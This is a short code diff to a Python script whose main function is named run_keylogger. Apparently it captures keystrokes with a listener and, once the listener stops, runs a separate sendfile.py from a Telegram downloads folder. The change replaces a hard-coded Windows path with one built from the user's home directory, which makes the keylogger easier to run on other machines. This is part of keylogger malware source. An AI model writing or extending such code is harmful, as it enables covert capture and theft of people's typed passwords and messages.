@@ -33,8 +33,12 @@ def run_keylogger():
         stop_thread.start()
         listener.join()
 
+    # Dynamically construct the path to sendfile.py
+    home_dir = os.path.expanduser("~")
+    sendfile_path = os.path.join(home_dir, "Downloads", "Telegram Desktop", "sendfile.py")
+
     # Run sendfile.py after listener stopped
-    subprocess.run(["python", "C:\\Users\\Admin\\Downloads\\Telegram Desktop\\sendfile.py"])
+    subprocess.run(["python", sendfile_path])
 
 if __name__ == "__main__":
     run_keylogger()
